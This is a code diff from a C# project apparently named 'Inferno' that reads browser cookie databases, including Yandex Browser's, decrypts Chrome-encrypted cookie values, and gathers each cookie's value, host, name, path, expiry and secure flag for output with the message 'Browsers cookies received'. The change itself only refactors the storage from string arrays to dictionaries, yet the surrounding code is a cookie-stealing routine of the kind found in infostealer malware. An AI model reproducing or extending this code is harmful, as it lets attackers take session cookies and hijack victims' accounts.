@@ -45,7 +45,7 @@ namespace Inferno
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<string[]> cookie = new List<string[]>();
+            List<Dictionary<string, string>> cookies = new List<Dictionary<string, string>>();
             // Database
             string tempCookieLocation = "";
 
@@ -87,22 +87,22 @@ namespace Inferno
                         break;
                     }
 
-                    string[] cookies = new string[6]
+                    Dictionary<string, string> credentials = new Dictionary<string, string>
                     {
-                        Crypt.toUTF8(Crypt.decryptChrome(value, browser)),
-                        hostKey,
-                        Crypt.toUTF8(name),
-                        path,
-                        expires,
-                        isSecure
+                        ["value"] = Crypt.toUTF8(Crypt.decryptChrome(value, browser)),
+                        ["hostKey"] = hostKey,
+                        ["name"] = Crypt.toUTF8(name),
+                        ["path"] = path,
+                        ["expires"] = expires,
+                        ["isSecure"] = isSecure
                     };
-                    cookie.Add(cookies);
+                    cookies.Add(credentials);
                     continue;
                 }
                 continue;
             }
 
-            output.cookies = cookie;
+            output.cookies = cookies;
             core.Exit("Browsers cookies received", output);
         }
     }
